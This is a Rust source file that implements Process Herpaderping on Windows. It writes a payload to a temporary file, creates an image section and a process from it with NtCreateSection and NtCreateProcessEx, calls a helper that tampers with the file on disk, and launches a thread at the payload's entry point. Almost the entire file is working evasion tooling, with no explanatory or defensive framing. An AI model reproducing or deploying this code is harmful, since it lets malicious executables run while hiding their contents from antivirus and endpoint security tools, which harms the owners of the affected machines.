use std::{fs::OpenOptions, io::Write, ptr::null_mut};

use ntapi::{
    ntmmapi::NtCreateSection,
    ntpsapi::{NtCreateProcessEx, NtCreateThreadEx},
};
use widestring::U16CString;
use winapi::{
    ctypes::c_void,
    shared::ntdef::NT_SUCCESS,
    um::{
        fileapi::CreateFileW,
        handleapi::CloseHandle,
        processthreadsapi::GetProcessId,
        winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_NT_SIGNATURE, THREAD_ALL_ACCESS},
    },
};

use crate::init_params::init_params;
use crate::process_herpaderping::process_herpaderping;
pub fn create_file_section(
    path_temp: String,
    buffer: Vec<u8>,
    dir_temp: String,
    // args: &String,
    file_path: &String,
) -> Result<(), Box<dyn std::error::Error>> {
    // code here !
    unsafe {
        let mut destination = OpenOptions::new()
            .write(true)
            .truncate(true)
            .open(&path_temp)?;

        destination.write_all(&buffer)?;
        destination.flush()?;

        let path_name = U16CString::from_str(&path_temp).unwrap();

        let h_file = CreateFileW(
            path_name.as_ptr(),
            0x80000000 | 0x40000000,
            0x00000001 | 0x00000002 | 0x00000004,
            null_mut(),
            3,          /*OPEN_EXISTING*/
            0x00000080, // FILE_ATTRIBUTE_NORMAL,
            null_mut(),
        );

        if h_file.is_null() {
            eprintln!("[-] CreateFileW Failed");
            CloseHandle(h_file);
            std::process::exit(0x100);
        }

        let mut h_section = null_mut();

        // NTSTATUS option !
        let mut status;

        status = NtCreateSection(
            &mut h_section,
            0xF001F,
            null_mut(),
            null_mut(),
            0x02,
            0x1000000,
            h_file,
        );

        if !NT_SUCCESS(status) {
            eprintln!("[-] NtCreateSection Failed. Error code: {}", status);
            CloseHandle(h_section);
            std::process::exit(0x100);
        }

        let mut h_process: *mut winapi::ctypes::c_void = null_mut();

        status = NtCreateProcessEx(
            &mut h_process,
            0x000F0000 | 0x00100000 | 0xFFFF,
            null_mut(),
            -1isize as *mut c_void, /* NtCurrentProcess */
            0x00000004,             /* PROCESS_CREATE_FLAGS_INHERIT_HANDLES */
            h_section,
            null_mut(),
            null_mut(),
            0,
        );

        if !NT_SUCCESS(status) {
            eprintln!("[!] NtCreateProcessEx Failed. Error: {}", status);
            CloseHandle(h_section);
            std::process::exit(0x100);
        }

        println!("[*] PID: {}", GetProcessId(h_process));
        CloseHandle(h_section);

        // process_herpaderping func
        process_herpaderping(h_file, file_path)?;

        let base_address = init_params(h_process, path_temp, dir_temp)?;
        let address_entrypoint = search_entrypoint(&buffer)?;
        let entry_point = ((base_address as usize) + address_entrypoint) as *mut c_void;

        let mut h_thread = null_mut();

        status = NtCreateThreadEx(
            &mut h_thread,
            THREAD_ALL_ACCESS,
            null_mut(),
            h_process,
            entry_point,
            null_mut(),
            0,
            0,
            0,
            0,
            null_mut(),
        );

        if !NT_SUCCESS(status) {
            eprintln!("[-] NtCreateThreadEx Failed with Status: {}", status);
        }
    }

    Ok(())
}

fn search_entrypoint(buffer: &[u8]) -> Result<usize, String> {
    unsafe {
        let dos_header = buffer.as_ptr() as *mut IMAGE_DOS_HEADER;
        let nt_header =
            (dos_header as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
        if (*nt_header).Signature != IMAGE_NT_SIGNATURE {
            return Err("[!] IMAGE NT SIGNATURE INVALID".to_string());
        }

        Ok((*nt_header).OptionalHeader.AddressOfEntryPoint as usize)
    }
}
